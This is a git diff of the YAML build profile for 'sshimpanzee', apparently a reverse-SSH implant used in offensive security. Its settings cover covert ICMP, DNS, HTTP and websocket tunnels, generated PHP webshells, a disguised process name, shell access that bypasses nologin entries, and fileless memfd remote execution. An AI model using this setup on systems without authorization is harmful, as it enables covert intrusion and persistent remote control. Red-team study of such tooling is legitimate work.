@@ -1,39 +1,41 @@
 ###
-# This is sshimpanzee build configuration file
-# YAML is used to describe what behaviour and feature should the sshimpanzee get
+# This is sshimpanzee build profile
+# YAML is used to describe what behaviour and feature should the sshimpanzee binary run with
 ###
 
 ### General config
-
 process_name: "sshimpanzee" # Name of the process as it appears in ps (yet you won't be able to kill it with this name)
 
-
-banner: True # Should the banner be displayed at log
-verbose: 3 # Verbosity level as written in build/build.log
+banner: true # Should the banner be displayed at login
 
 shell: "/bin/sh" # Default shell to pop for user, bypassing /etc/passwd entries with false or nologin as shell
 timer: 60*1000*1000  # Time in milliseconds before a new sshimpanzee child is forked after exiting. For example in sock MODE, a new sshd connection will be made 1 minute after the previous one is dead
 
-keygen: True # Re generate keys during build, insure a new HOST and CLIENT keys is used
+keygen: true # Re generate keys during build, insure a new HOST and CLIENT keys is used
 public_key: #if new keys are not regenerated it is possible to specify a public client key to authenticate (only ed25519 keys are supported)
 #public key: "ssh-ed25519 .... ROGUE@ROGUE"
 
-make: True # Keep it to true if you want the builder script to generate sshd binary
-force_clean_build: True #Currently required for docker builds, will force builder script to recompile tunnels and dependances
-reconf: True # Required for docker builds
-
+#Loglevel as described in sshd_config
+loglevel: DEBUG2
 
 ### Environment
 # sshimpanzee is configured at runtime through environment variables, yet, it is possible to preset environment variable, to get a default behavior
-
-
 env:
   if_not_set : # Variable here will be set if they do not already exists
     REMOTE: 127.0.0.1
     PORT: 8080
     MODE: sock # MODE environment variable is used to manage the default tunnel
   overwrite: # Variable here will overwrite already existent 
-    
+
+
+sshd_extra_config:
+  AcceptEnv: '*' #This will allow users to specify their own environment variable using ssh -o SetEnv=ENVIRONMENT=VALUE
+  PasswordAuthentication: 'no'
+  KbdInteractiveAuthentication: 'no'
+  PermitUserRc: 'no'
+  PermitUserEnvironment: 'no'
+  GatewayPorts: 'yes'
+  
 
 ### Tunnels
 # sshimpanzee come with different tunneling mecanisms
@@ -41,33 +43,69 @@ env:
 # Tunnel compilation parameters can be specified here 
 tun:
   sock:
-      enabled: True
+    enabled: true
 
   icmp:
-      enabled: True
-      buildserv: True # should the corresponding ICMPTunnel server be built 
-      raw_sock: False # build with support for raw sock for older kernels
+    enabled: false
+    buildserv: true # should the corresponding ICMPTunnel server be built 
+    raw_sock: false # build with support for raw sock for older kernels
 
-  http_enc :
-      enabled: True
-      key: # web shell key, empty will result in a new key being generated
-      targets:
-        - "php" # list of language you want to generate webshells for 
-      path_fd: "/dev/shm/sshim" # Fifo that sshimpanzee will use to communicate with webshells
+  http_server_reuse :
+    enabled: false
+    key: # web shell key, empty will result in a new key being generated
+    targets:
+      - "php" # list of language you want to generate webshells for 
+    path_fd: "/dev/shm/sshim" # Fifo that sshimpanzee will use to communicate with webshells
 
+  http_client:
+    enabled: false
+    use_web_socket_if_possible: true
+    proxy_support: true
+    poll_url : "/"
+    send_url: "/"
+    
   dns:
-      enabled: True    
-      resource: sshimpanzee # DNS2TCP Resource
-      key: sshimpanzee # DNS2TCP key
-      obfuscate: True # obfuscating DNS2TCP Magic string, this will force the build of the corresponding srver
-      buildserv: False 
-      qtype: TXT # Type of query used by DNS2TCP
+    enabled: false  
+    resource: sshimpanzee # DNS2TCP Resource
+    key: sshimpanzee # DNS2TCP key
+    obfuscate: true # obfuscating DNS2TCP Magic string, this will force the build of the corresponding srver
+    buildserv: false 
+    qtype: TXT # Type of query used by DNS2TCP
 
   proxysock:
-      enabled: True
+    enabled: false
 
+  udp:
+    enabled: false
+    buildserv : true
+    buildclient: true
+
+  websocket:
+    enabled: true
+    
   no_build:
-      enabled: False 
-      path: []
+    enabled: false 
+    path: []
+
+### Subsystem
+# sshimpanzee offers subsystem mechanisms just like the subsystem mecanism of openssh sshd
+subsystems:
+
+  internal_sftp: # standard sftp as provided by openssh
+    enabled: true
+    name: sftp
+    exec: internal-sftp
+    is_internal: true
+    
+  remote_exec: # remote execution using fileless memfd technique
+    enabled: true
+    name: remote-exec
+    exec: internal-remote-exec
+    is_internal: true
 
 
+## Debug / Developpement build option
+make: true # Keep it to true if you want the builder script to generate sshd binary
+force_clean_build: false #Currently required for docker builds, will force builder script to recompile tunnels and dependances
+reconf: true # Required for docker builds
+verbose: 3 # Verbosity level as written in buildlog
